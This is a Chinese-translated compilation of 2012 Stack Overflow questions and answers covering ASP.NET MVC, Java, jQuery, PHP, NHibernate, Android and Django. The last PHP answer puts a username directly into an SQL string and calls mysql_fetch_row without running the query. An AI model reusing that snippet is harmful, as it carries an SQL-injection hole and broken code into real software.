        </td>
        <td>
        <input id="TextFacilityGroupID" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="FacilityName">FacilityName:</label>
        </td>
        <td>
        <input id="TextFacilityName" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="FacilityAddressLine1">FacilityAddressLine1:</label>
        </td>
        <td>
        <input id="TextFacilityAddressLine1" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="FacilityAddressLine2">FacilityAddressLine1:</label>
        </td>
        <td>
       <input id="TextFacilityAddressLine2" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="FacilityAddressLine3">FacilityAddressLine1:</label>
        </td>
        <td>
        <input id="TextFacilityAddressLine3" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="CityId">CityId:</label>
        </td>
        <td>
        <input id="TextCityId" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="StateId">StateId:</label>
        </td>
        <td>
        <input id="TextStateId" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="CountryId">CountryId:</label>
        </td>
        <td>
        <input id="TextCountryId" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="Zipcode">Zipcode:</label>
        </td>
        <td>
        <input id="TextZipcode" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="PhoneNo">PhoneNo:</label>
        </td>
        <td>
        <input id="TextPhoneNo" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="Status">Status:</label>
        </td>
        <td>
        <input id="TextStatus" type="text" />
        </td>
        </tr>
        <tr>
        <td>
       <label for="EmailId">EmailId:</label>
        </td>
        <td>
        <input id="TextEmailId" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <label for="Website">Website:</label>
        </td>
        <td>
        <input id="TextWebsite" type="text" />
        </td>
        </tr>
        <tr>
        <td>
        <input id="Submit1" type="Submit" value="submit" />
        </td>
        </tr>
        </table>
    </div>
</body>
</html> 
```

我的模型看起来像：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace AmanoMockUp.Models
{
    public class FacilityModels
    {
        public int TenantId { get; set; }
        public int FacilityId { get; set; }
        public int FacilityGroupId { get; set; }
        public string FacilityName { get; set; }
        public string FacilityAddressLine1 { get; set; }
        public string FacilityAddressLine2 { get; set; }
        public string FacilityAddressLine3 { get; set; }
        public int CityId { get; set; }
        public int StateId { get; set; }
        public int CountryId { get; set; }
        public string Zipcode { get; set; }
        public int PhoneNo { get; set; }
        public bool status { get; set; }
        public string EmailId { get; set; }
        public string Website { get; set; }
        public DateTime CreationDate { get; set; }

    }
} 
```

现在我需要在提交按钮时将在各种文本字段中的视图中输入的值更新到我的数据库中

```
<input id="Submit1" type="Submit" value="submit" /> 
```

我应该在哪里写 buttonclick 事件应该在控制器或模型上，或者我应该为同一个控制器创建一个全新的控制器。请帮助！我已经搜索过，但找不到与我的问题相关的任何内容。提前谢谢！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:36:47.500

让您的视图针对您的模型进行强类型化，并让表单将值提交给执行该工作的操作方法怎么样？在 Html.BeginForm 上进行一些搜索，以获取有关让表单在提交时调用特定操作的指针，以及几乎所有基本的 MVC 教程，以将视图强类型化到模型中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:36:29.710

数据库调用应该在控制器中。

在控制器中创建另一个具有 [HttpPost] 属性但名称相同的操作。它将模型作为其参数。然后完成数据库逻辑并保存更改并返回视图。

看看这里的例子 [http://www.c-sharpcorner.com/UploadFile/krishnasarala/select-insert-update-and-delete-with-Asp-Net-mvc/](http://www.c-sharpcorner.com/UploadFile/krishnasarala/select-insert-update-and-delete-with-Asp-Net-mvc/)

# java - 如何拆分sql查询并使用java执行它们？

> ID：11935326
> 
> 赞同：1
> 
> 时间：2012-08-13T13:33:03.943
> 
> 标签：java, sql, oracle

我有一个包含 sql 脚本的文件，包括 DDL 和 DML 脚本，如创建、插入、更新、删除、创建视图等。

我需要正确拆分它们并执行它们，任何建议..

提前致谢

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-13T13:38:44.923

最终重复的问题：将[多个 SQL 语句拆分为单独的 SQL 语句](https://stackoverflow.com/questions/633014/split-multiple-sql-statements-into-individual-sql-statements)

要执行你可以使用类似的东西：

```
Statement stmt = conn.createStatement();
for(String statement : statements) {
    stmt.addBatch(statement);
}
stmt.executeBatch(); 
```

# java - Servlet：sendRedirect 重定向到不正确的 url？

> ID：11935327
> 
> 赞同：0
> 
> 时间：2012-08-13T13:33:07.303
> 
> 标签：java, eclipse, jakarta-ee, servlets

我从 Eclipse 的服务器视图运行我的应用程序。目前向用户显示的网址如下所示：

```
http://localhost:8082/EclipseProjectName/path 
```

我没有在我的文件中的任何地方指定这个 EclipseProjectName，但它就在那里。

目前，当我调用时`response.sendRedirect("/path")`，用户不会重定向到`http://localhost:8082/EclipseProjectName/path`，而是重定向到`http://localhost:8082/path`

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:42:32.287

您应该重定向到`response.sendRedirect(request.getContextPath() + "/path");`但我不知道这是否是正确的方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-06T20:18:58.347

尝试不使用斜线：

> response.sendRedirect("路径");

# jquery - jQuery背景位置动画？

> ID：11935330
> 
> 赞同：1
> 
> 时间：2012-08-13T13:33:30.010
> 
> 标签：jquery

我基本上已经有了这个：http: [//jsfiddle.net/BnJ3G/1/](http://jsfiddle.net/BnJ3G/1/)这或多或少是一个取决于滚动事件的背景动画。类似于视差类型函数。

如果可能的话，我基本上需要为 X 和 Y 位置复制所有功能，也许像这样简单：

```
$('#element1').animatePosXY(VAL, VAL);
$('#element2').animateNegXY(VAL, VAL); 
```

ETC...

如果可能的话，我很想得到帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:23:51.230

不用担心，我一直在使用它，并且使用相同的功能，我可以根据窗口滚动显式设置背景位置，花了 4 个多小时完成它，但终于到了！

# php - CSS 预处理器：数据库中的 Sass、Less、Php 和 Vals

> ID：11935336
> 
> 赞同：2
> 
> 时间：2012-08-13T13:33:43.107
> 
> 标签：php, sass, less

我终于深入研究 CSS 预处理，并试图找出最佳途径。我的主要问题是：

1.  使用 SASS 或 LESS 而不是 Php 有什么价值？
2.  如果我要使用 SASS 或 LESS，整合数据库中的值的最佳方法是什么？

显然使用 php 在标题中打印样式是一个非常糟糕的主意。我正在使用 php 创建样式表，并将其导入为“Content-Type: text/css”。然后它将创建样式表，该样式表将按原样提供并正确缓存。我可以使用数据库中的值并使用我已经熟悉的语言。

在创建/使用样式表方面，SASS 和 LESS 比 Php 有什么优势，如果我使用它们，使用数据库中的值的最佳方法是什么？我是否需要使用 Php 从数据库中获取值，基本上继续我上面的方法，仅用于该用途，然后使用 SASS、LESS 或其他来处理样式表的其余部分？

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:46:04.777

像 SASS 和 LESS 这样的 CSS 预处理器给你的不仅仅是用动态代码提供 PHP（或任何其他服务器端语言）文件，还提供`content-type:text/css`

他们给你：

*   **Mixins——**类的类。
*   **参数混合**- 您可以向其传递参数的类，如函数。
*   **嵌套规则**——类中的类，减少重复代码。
*   **操作**——CSS 中的数学。
*   **颜色功能**- 编辑您的颜色。
*   **命名空间**——可以被引用调用的样式组。
*   **范围**- 对样式进行本地更改。
*   **JavaScript 评估**– 在 CSS 中评估的 JavaScript 表达式。

自己在 PHP 中完成所有这些工作将是一项公平的努力！

关于从数据库中获取数据并在您的 SASS / LESS 中使用它，预处理器不允许您开箱即用。您可以编写自己的 PHP 代码，该代码将从数据库中读取，收集您需要的信息和值，然后使用这些值将 SASS 或 LESS 文件写入文件系统。如果您不需要预处理器提供的上述功能，您也可以编写一个普通的 CSS 文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-20T16:35:16.943

作为一个经常使用 php 并且已经使用 Sass 几个月的人：

1.  使用 SASS 或 LESS 而不是 Php 有什么价值？

在这些预处理器中，所有的工作都已经为你完成了。您可以使用自己编写的 php 实现相同的目标，但这会浪费时间。几个月甚至几年的工作、测试和评估已经进入了 Sass 和 Less，仅举两个例子。为什么要复制这项工作？

许多 IDE 已经支持 .scss 文件的语法高亮显示，例如，可以更轻松地阅读和编写代码。

你不需要服务器来运行 Sass 或 Less，这使得它们非常便携。Sass 确实需要 Ruby，但 Less 只需要 javascript，即：它可以在任何地方运行。

使用像 Sass 这样的东西会让你以一种非常结构化的方式思考你的 CSS，并鼓励一些好的习惯。

1.  如果我要使用 SASS 或 LESS，整合数据库中的值的最佳方法是什么？

我从来没有做过这样的事情，但我可以这样处理它。在数据库中有一个专门用于存储变量的表，从一个 id、一个类名和一个存储为文本字符串的值开始，无论是测量值还是十六进制颜色，无论您需要什么。

每当您向表中添加新定义时，运行一个脚本来更新一个 .scss 文件（如果您使用的是 Sass），称为 db_values.scss 只需在文本中写入列出一大堆变量及其值，在预处理器所需的语法中。

在你的主预处理器文件中，导入这个生成的文件，它不会给你臃肿的样式表，生成的 css 只会使用它需要的变量。

# android - 上下文在android中的重要性

> ID：11935338
> 
> 赞同：-1
> 
> 时间：2012-08-13T13:34:01.973
> 
> 标签：android

> **可能重复：**
> [什么是 Android 中的上下文？](https://stackoverflow.com/questions/3572463/what-is-context-in-android)

我在应用程序/对象的android当前状态中读取上下文

```
 Intent intent=new Intent(this,SecondaryActivity.class);
   startActivity(intent); 
```

代替`this`我们可以使用`getApplicationContext()` 但在

```
@Override
public void onClick(View view) {

Toast.makeText(getApplicationContext(), "Hai",Toast.LENGTH_LONG).show();
} 
```

我们不能`this`在这里使用我的意思是`getApplicationContext()`为什么 this 也指当前对象，因此我对此感到困惑`this`并`context`帮助我研究它，参考分享给我..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:41:00.957

当你传递`this`给方法时，你的意思是`this`引用是 的一个实例`Context`，所以如果你在 Activity 中，你可以传递 this 而不是 Context。但是当你在匿名课堂上时：

```
button.setOnClickListener(new OnClickListener(){
     @Override
     public void onClick(){
         //here this is a reference to OnClickListener instance
     } 
```

要传入方法`Context`，`onClick`您可以编写

```
MyActivity.this 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:36:56.153

Activity 是上下文的子类，因此所有`Activity`对象也是`Context`：

```
android.content.Context
   ↳    android.content.ContextWrapper
       ↳    android.view.ContextThemeWrapper
           ↳    android.app.Activity 
```

因此，如果您不能使用`this`，则表示`this`不是`Context`类或其子类的实例。

# jquery - 从表中拖放

> ID：11935340
> 
> 赞同：1
> 
> 时间：2012-08-13T13:34:10.620
> 
> 标签：jquery, html-table, drag-and-drop

我在表格中使用拖放元素。但我还需要将元素拖出表格，并将它们放在“bin icon”上以删除它们。

拖放在表格中效果很好，但是当我想拖出表格时，它们被隐藏（它们位于我页面的其他元素下）。我已经尝试了 z-index 和 position 属性，但没有成功。

有人有想法吗？

我谈论 html 的这些部分：

```
<div id="calendar">
  <div class="ui-widget wc-container">
    <div class="ui-widget-header wc-toolbar">
      <div class="ui-widget-content wc-header">
        <div class="wc-scrollable-grid" style="height: 416px;">
          <table class="wc-time-slots">
            <tbody>
              <tr class="wc-grid-row-timeslot">
              <tr class="wc-grid-row-oddeven">
              <tr class="wc-grid-row-events"> 
```

这些元素在 wc-grid-row-events 中，我想将它们放在 wc-header 上

我的 javascript 是：

```
 $calEvent.draggable({
            containment: '#Calendrier', //pour permettre le drag des saisies jusqu'à l'icône corbeille
            revert: 'invalid',
            opacity: 0.5,
            start: function (event, ui) {
                var $calEvent = ui.draggable || ui.helper;
                options.eventDrag(calEvent, $calEvent);
                ui.helper.css("z-index", "10");
                ui.helper.css("position", "absolute");
            }
        }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:45:37.643

没有示例代码很难提出建议。但是，假设您正在使用可拖动的设施。

```
$("#draggableid").draggable({ containment: "document" }); 
```

这应该适用于您的情况。默认情况下，包含是父级，在您的情况下是表。但如果你把收容作为文件。可以在整个文档中拖动窗口。

你不应该使用 tr 作为你的可拖动元素。如果您希望行可拖动，请使用“div”“ul”和“li”标签。由于它们不会成为表格的一部分，因此您可以轻松地将它们拖到任何地方。

参考来源：http: [//jqueryui.com/demos/sortable/](http://jqueryui.com/demos/sortable/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T13:44:26.663

你在使用[jQuery UI Draggable 吗？](http://jqueryui.com/demos/draggable/)
如果是这样，我认为该**`appendTo`**选项在您的情况下很有趣：

> appendTo 选项传递或选择的元素将在拖动过程中用作可拖动助手的容器。默认情况下，助手被附加到与可拖动对象相同的容器中。

例如：

```
$( ".selector" ).draggable({ appendTo: "body" }); 
```

# python - 使用 os.environ 在 Python 中获取当前 URL

> ID：11935348
> 
> 赞同：0
> 
> 时间：2012-08-13T13:34:25.113
> 
> 标签：python, url

*我*不必使用`os.environ`，但这可能是最简单的方法。

我可以使用以下方法成功获取以前的 URL：

```
sURL = os.getenv('HTTP_REFERER') 
```

和当前字符串的参数使用：

```
sURL = os.environ['QUERY_STRING'] 
```

但我无法获取**当前**URL。

[这里的其他答案](https://stackoverflow.com/questions/2764586/get-current-url-in-python)建议：

```
sURL = self.request.url 
```

（或[self.request.host](https://stackoverflow.com/questions/4094715/has-any-easy-way-to-get-full-url-using-python-on-gae)）但是当我这样做时，我得到：

```
 sURL = self.request.url NameError: global name 'self' is not defined 
```

如何轻松获取当前 URL？

完整代码：

```
import os

def GetTestMode ():

    sURL = self.request.url
    print '<br />sURL = ' + sURL + '<br />' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T13:44:20.953

感谢一位同事，这可以通过以下方式解决：

```
 import os.path
    sURL = os.path.realpath('.')
    print 'sURL = ' + sURL + '<br />' 
```

请参阅[os.path](http://docs.python.org/library/os.path.html)，它说*“返回指定文件名的规范路径，消除路径中遇到的任何符号链接（如果操作系统支持它们）。”*

所以这不会返回 URL 而是文件路径，但我也可以使用它。

# nhibernate - 休眠查询结束。OrderBy 使用字符串属性名称。

> ID：11935351
> 
> 赞同：8
> 
> 时间：2012-08-13T13:34:31.913
> 
> 标签：nhibernate, nhibernate-criteria, queryover

我正在将旧式查询重构`CreateCriteria()`为`QueryOver()`. 我的 Wcf 服务可以`string PropertyName`订购查询结果。因为`IQueryable`我使用动态 LINQ 来进行这样的排序，对于`CreateCriteria()`- `AddOrder()`。

```
IList<object[]> result =
            GetSession()
                .QueryOver(() => activity)
                .JoinAlias(() => activity.ActivityLicense, () => license)
                .Select(Projections.ProjectionList()
                            .Add(Projections.Count<Activity>(e => e.Id), "ActivityCount")
                            .Add(Projections.Group(() => license.SerialNumber), "SerialNumber")
                            .Add(Projections.Count<Activity>(e => e.MacAdress), "MacAddressCount")
                            .Add(Projections.Count<Activity>(e => e.IpAdress), "IpAddressCount")
                )
                .OrderByAlias("ActivityCount") // Compilation Error - I need such extension method
                .List<object[]>(); 
```

如果使用字符串属性名称，有什么建议如何进行排序？

PS：我无法使用 LINQ to Nhibernate：[LINQ to NHibernate - .GroupBy().Skip().Take() 导致异常](https://stackoverflow.com/questions/11879828/linq-to-nhibernate-groupby-skip-take-cause-an-exception)

谢谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-08-13T14:47:04.270

你总能得到`UnderlyingCriteria`...

```
var q = GetSession()
                .QueryOver(() => activity)
                .JoinAlias(() => activity.ActivityLicense, () => license)
                .Select(Projections.ProjectionList()
                            .Add(Projections.Count<Activity>(e => e.Id), "ActivityCount")
                            .Add(Projections.Group(() => license.SerialNumber), "SerialNumber")
                            .Add(Projections.Count<Activity>(e => e.MacAdress), "MacAddressCount")
                            .Add(Projections.Count<Activity>(e => e.IpAdress), "IpAddressCount")
                );

q.UnderlyingCriteria.AddOrder(new Order("ActivityCount", true));

var results = q.List(); 
```

或作为 IQueryOver 的扩展方法

```
public static IQueryOver<T,T> OrderByAlias(this IQueryOver<T,T> q, string aliasName, bool ascending)
{
    q.UnderlyingCriteria.AddOrder(new Order(aliasName, ascending));
    return q;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T06:01:22.423

您可以通过传入 QueryOver API 直接设置 OrderBy `Projections.Property(propName)`，例如：

```
var query = GetSession()
                .QueryOver<Activity>()
                .OrderBy(Projections.Property("ActivityCount").Desc; 
```

无法通过字符串设置方向，因此您必须执行简单的 if/else 或创建扩展方法来简化 API。

# objective-c - 如何在另一个视图中使用已经初始化的类？

> ID：11935360
> 
> 赞同：0
> 
> 时间：2012-08-13T13:35:06.487
> 
> 标签：objective-c, ios, cocoa-touch, class, uiviewcontroller

我正在制作一个具有多个选项卡视图的 iOS 应用程序。其中两个视图使用相同的视图控制器，因此它们都有一个实例。我想知道是否可以只为两个视图使用视图控制器的一个实例。我想这样做的原因是因为我在一个使用 GameKit 对等选择器的视图上有一个“连接”和“断开连接”按钮，而我在另一个必须使用我从创建的会话的视图上有一个“发送文件”带有连接按钮的其他视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:41:59.710

在属于 tabBarController 的任何 viewController 中：

```
UIViewController *vc1 = [self.tabBarController.viewControllers objectAtIndex:0];
MyCustomClass *sharedObject = [vc1 theObject];
UIViewController *vc2 = [self.tabBarController.viewControllers objectAtIndex:1];
[vc2 setTheObject:sharedObject]; 
```

您应该为两个视图控制器的“theObject”设置@property

# jquery - jQuery 动画在具有透明渐变的 firefox 上不稳定。有什么退路吗？

> ID：11935363
> 
> 赞同：2
> 
> 时间：2012-08-13T13:35:09.263
> 
> 标签：jquery, css

我设计了一个透明度很高的页面。它的一些部分使用了半透明的 CSS3 渐变。现在这些渐变效果很好，但是 Firefox 对它们和 jQuery 有问题。如果有半透明的 CSS3 渐变，页面上的大多数 jQuery 动画会变得不稳定。

有没有 jQuery 方法来生成渐变？这将有助于消除 Firefox 中动画的不连贯性吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:56:02.980

您可以使用[SVG Gradients](http://apike.ca/prog_svg_gradients.html)或像[这样](http://www.bennadel.com/blog/1014-Creating-Transparent-Gradients-With-jQuery.htm)的 jQuery 插件。

# c# - 使用用户名/密码访问 Google Calendar API

> ID：11935370
> 
> 赞同：3
> 
> 时间：2012-08-13T13:35:23.460
> 
> 标签：c#, .net, api

我正在编写一个小客户端来将机器上的 Outlook 日历与用户的谷歌日历同步。我正在使用 .Net (C#)。我刚刚阅读了有关使用 .NET 的 Google API 客户端库访问 Google 日历 API 的信息，并尝试了一些基本的东西。

现在关于授权，据我了解，新的“OAuth 2.0”授权需要“用户同意”，这意味着用户被定向到谷歌页面，他们必须明确允许我的应用程序访问他们的日历。好像这种用户交互还不够，作为一名程序员，我必须处理“访问令牌”或“刷新令牌”以及所有这些东西。

现在我的问题是：真的没有更简单的方法可以让已安装的应用程序与 google API 通信以访问用户的日历吗？

我希望我的用户在“设置”对话框中输入他的用户名/密码。他的凭据将存储在本地（当然是加密的），然后在以后通过谷歌 API 进行每次访问时使用。我知道这可能是危险的，但我希望这个决定与我同在。

那么，这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T13:39:21.987

不，那是不可能的。OAuth的**重点**是用户永远不会向第三方（您）提供他们的用户名和密码。您获得的唯一东西是一个允许您连接的令牌，用户可以随时撤销该令牌。（此外，如果用户更改了他的密码，您仍然可以使用相同的保存令牌，而无需让用户更新他们的设置）。

如果您决定通过保存用户名和密码并自己执行“授权”来“解决”此问题，您将违反 API 的 TOS，并且您的应用程序将被 Google（或任何 OAuth 提供商，如果您尝试它）禁止与其他人）不遵守规则。

# arrays - Twig 模板：在 JOIN 函数中添加 html

> ID：11935372
> 
> 赞同：2
> 
> 时间：2012-08-13T13:35:25.170
> 
> 标签：arrays, templates, join, symfony, twig

我可以使用以下方法获取与帖子相关的所有标签：

```
{{ post.tags | join(', ') }} 
```

它会显示：

```
tag1, tag2, tag3, etc 
```

我怎样才能让这些标签成为链接，而不仅仅是文本？我是说：

```
<a href="tag1.php">tag1</a>, <a href="tag2.php">tag2</a>, <a href="tag3.php">tag3</a>, etc 
```

我是否被迫使用 foreach()、单独显示标签并手动添加逗号？

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T16:26:06.793

是的，按照卡洛斯的说法检查最后一个条目，这样你就不会在末尾有一个 lonley 逗号，例如：
*tag1，tag2，*

```
{% for tag in post.tags %}
    <a href="{{tag}}.php">{{tag}}</a>{% if loop.last == false %},{% endif %} 
{% endfor %} 
```

这将呈现：
*tag1, tag2*
就像 join 一样。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-13T14:11:57.577

手动做，不复杂

```
{% for tag in post.tags %}
    <a href="{{tag}}.php">{{tag}}</a>,
{% endfor %} 
```

# c# - 编辑html模板

> ID：11935374
> 
> 赞同：1
> 
> 时间：2012-08-13T13:35:30.617
> 
> 标签：c#, html

我将在我的应用程序中创建一个函数，该函数将向列表中的多个接收者发送 som 状态邮件。

之前我在电子邮件上使用平面文本格式，但现在我想基于 som html 模板发送邮件。我需要一些提示，以便在发送之前将数据插入这些模板的好方法。

eks

%CPU状态%

%硬盘状态%

等等。除了用数据填充锚点的方法之外，我有所有的解决方案。这是一个 WinForm 应用程序，所以我无法访问 ASP 功能

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T13:42:09.757

也许这种事情是最简单的？

```
// This would most likely be loaded from a file or database.
string emailBody = "CPU Status: %CpuStatus%\nHard Drive Status: %HardriveStatus%";

string cpuStatus = MyService.GetCpuStatus();

emailBody.Replace("%CpuStatus%", cpuStatus); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:05:00.240

如果你真的想用它来做一个大项目，你可以使用一个 webbrowser 控件，用你的 html 文件加载它，然后使用 WebBrowser 的 Document 属性来获取一个 HtmlDocument 对象。然后，您可以循环遍历它的子项（递归地）以查找要更改的标签。

就个人而言，我会使用之前建议的 .Replace 方法。

# sql - 通过外键获取最新的 N 项

> ID：11935379
> 
> 赞同：1
> 
> 时间：2012-08-13T13:35:38.077
> 
> 标签：sql, django

我正在尝试为每个作者获取最新的 3 本书，使用 DateField 作为日期。任何想法如何使用 Django ORM 或原始 SQL 来做到这一点？

```
class Author(models.Model):                                                                                                                                                                                                                                                              
    name = models.CharField('Name', max_length=100)                                                                                                
    slug = models.SlugField('Slug', max_length=100, unique=True)                                                                                      

class Book(models.Model):                                                                                                                                                                                                                                                               
    author = models.ForeignKey(Author, verbose_name='Author')                                                                       
    published = models.DateField('Published on', db_index=True) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T10:19:10.730

您可以遍历所有作者，为每个作者选择 3 本最新书籍并将它们添加到全局列表中：

```
books = []
for x in Author.objects.all():
   bookslist = Book.objects.filter(author=x).order_by('-published')[:3]
   for book in bookslist:
      books.append(book) 
```

# google-app-engine - GAE Golang - OAuth 和 OAuth2？

> ID：11935380
> 
> 赞同：5
> 
> 时间：2012-08-13T13:35:40.607
> 
> 标签：google-app-engine, login, oauth, oauth-2.0, go

我正在尝试实现一个 Google App Engine Go 应用程序，该应用程序将为用户登录使用 OAuth 和 OAuth2。我想知道这是否可能，如果可以，该怎么做？有人可以提供一个例子吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T14:23:07.540

您可以使用[goauth2](http://code.google.com/p/goauth2/)在 App Engine 上实现 OAuth2 客户端

然后，您可以通过请求`https://www.googleapis.com/auth/userinfo.profile`范围（如[使用 OAuth 2.0 进行登录）中所示，使用他们的 Google 帐户登录您的用户](https://developers.google.com/accounts/docs/OAuth2Login)

# java - 在两个 JPA 应用程序之间同步数据

> ID：11935381
> 
> 赞同：0
> 
> 时间：2012-08-13T13:35:39.853
> 
> 标签：java, hibernate, jpa, synchronization, offline-mode

我编写了一个使用 JPA（和 hibernate 作为持久性提供者）的应用程序。它适用于具有多个表的数据库。

我需要创建一个“离线模式”，其中充当客户端的程序副本允许相同的功能，同时在可访问时保持其数据与服务器同步。

目的是获得一个可以从服务器“分离”的客户端，对数据进行更改，然后将更改合并回来。有点像修订控制系统。

管理冲突并不重要，以防用户决定保留哪个版本。

我的想法，但它行不通，是为数据库中的每一行分配最后一个编辑时间戳。客户端最初下载整个数据库的副本，并且在未连接到服务器时修改行时还记录第二个时间戳。通过这种方式，它知道哪些数据发生了变化，以及它与服务器同步的最后一个时间戳。当您重新连接到服务器时，他将不得不询问自上次从服务器同步以来已更改的数据是什么，并发送已更改的数据。（稍微简化了一点，但冲突的管理应该问题不大）

当然，这在删除行的情况下不起作用。如果服务器或客户端都删除了一行，他们不会注意到它，而另一个永远不会知道。

解决方案是维护一个包含已删除行列表的表，但这似乎太昂贵了。

有谁知道一种有效的方法？已经有类似的东西了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:53:39.810

恩维尔：

> 如果您想有一个简单的解决方案，您可以创建类似于“时间戳”的版本字段。

审计：

> 如果你想拥有一个复杂、强大的解决方案，你应该使用 [Hibernateplugin](http://docs.jboss.org/envers/docs/index.html)

# jquery - 标记收音机检查，即使它被禁用

> ID：11935385
> 
> 赞同：0
> 
> 时间：2012-08-13T13:35:51.587
> 
> 标签：jquery, html

我正在尝试将单选按钮标记为已选中`click()`，但如果禁用了单选按钮，这将不起作用。

我该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T13:41:41.090

您想使用该`.prop()`方法。`.attr()`难以检测跨浏览器真实性

```
$('input:radio:disabled').prop('checked', true); 
```

^这将自动检查任何禁用的。

如果您希望它出现在某种点击事件等...您会这样做：

```
$('input:radio').prop('checked', true); 
```

[jsFiddle 演示](http://jsfiddle.net/m6K9x/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T13:40:09.373

唯一的解决方案来自 javascript/jquery -（最简单的 jquery 示例）

```
<input type="radio" id="test" name="test_name" disabled="disabled" />

$(document).ready(function() {
  $('#test').attr('checked', 'checked');      
});​ 
```

看到这个 jsFiddle [http://jsfiddle.net/7XevT/1/](http://jsfiddle.net/7XevT/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T13:39:53.623

唯一可以做到这一点的方法是在单选按钮前面放置一个元素（例如 div）并检查是否有点击。

鼠标事件在禁用元素上被禁用（有充分的理由......你已经禁用它！）

但是，可能有更好的方法来做你想做的事。我无法想象有人点击禁用的单选按钮。另外，如果您希望单选按钮可点击，请不要禁用它！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T13:46:55.230

`click`event* 是错误的使用方法。`click`禁用的元素不会对被单击做出反应（因为它们已被禁用），因此触发事件没有好处。

`<input type="radio" />`并且`<input type="checkbox" />`元素具有`checked`需要修改以更改其选中状态的属性：

### 使用普通的 JS：

```
<input id="r" type="radio" name="foo" value="bar" disabled />
<script type="text/javascript">
    document.getElementById('r').checked = true;
</script> 
```

### 使用 jQuery：

```
<input id="r" type="radio" name="foo" value="bar" disabled />
<script type="text/javascript">
    $('#r').prop('checked', true);
</script> 
```

[* 或函数，无法分辨您使用的是哪个。我认为它是`jQuery.fn.click`，它触发了一个事件。]

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T13:48:48.973

`disabled`输入不会触发点击事件。一种骇人听闻的方法是用另一个元素包装收音机：

```
<span class='radio'><input type='radio' disabled/></span> 
```

```
$('.radio').click(function(){
  var $input = $(this).find('input'); 
  $input.prop('checked', !$input.prop('checked'))
}) 
```

[演示](http://jsfiddle.net/K8ADL/)

但我不确定为什么输入应该是`disabled`检查状态时可以更改！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-13T14:16:59.787

游戏有点晚了，但你可以添加一个`<span>`可以放在单选按钮上的温度，这将产生你点击它的效果：

```
$('input[disabled="disabled"]').each(function(){
    $(this).wrap('<span style="position:relative;"></span>')
        $(this).parent().append('<span class="disabled" style="left:0; top:0; position:absolute; display:block; width:100%; height:100%;">&nbsp;</span>');
})

$('.disabled').click(function(){
    $(this).prev().removeAttr('disabled').attr('checked', 'checked').attr('disabled', 'disabled').unwrap();
    $(this).remove();
}) 
```

查看小提琴 - [http://jsfiddle.net/FTymF/](http://jsfiddle.net/FTymF/)

您还可以切换禁用的单选按钮：

```
$('.disabled').click(function(){
    if($(this).prev().attr('checked'))
        $(this).prev().removeAttr('disabled').removeAttr('checked').attr('disabled', 'disabled');
    else
         $(this).prev().removeAttr('disabled').attr('checked','checked').attr('disabled', 'disabled');
}) 
```

查看小提琴 - [http://jsfiddle.net/FTymF/1/](http://jsfiddle.net/FTymF/1/)

# php - 使用 php 拉取特定表行列数据以 html 输出

> ID：11935391
> 
> 赞同：0
> 
> 时间：2012-08-13T13:36:01.817
> 
> 标签：php, mysql, text

如何从我的数据库表中提取数据并将该数据放入只读文本输入中以供用户查看。

`<input readonly type="text" name="em1" id="em1"/>`

对于这个特定字段，我想从当前登录用户的行中名为 wmyt000 的列中提取数据，使用带有会话的 $username 变量，我创建该会话以在名为 cash_flow_plan 的表中获取当前登录用户的用户名

我使用 mysql 和 php

我还没有尝试过任何尝试。我正在调查，`mysql_fetch_array`但想显示他们所在行的所有用户信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T13:40:12.910

> 我还没有尝试过任何尝试。

是的。好吧，如果你有，你会知道你可以做的比你想象的要多。

如果您编写一个限制结果的查询，那么您将得到您想要的。

```
$query = "SELECT wmyt000 FROM cash_flow_plan WHERE username = '$username'"

$row = mysql_fetch_row($query);

print_r($row); // now you can see the structure of your array. access it accordingly. 
```

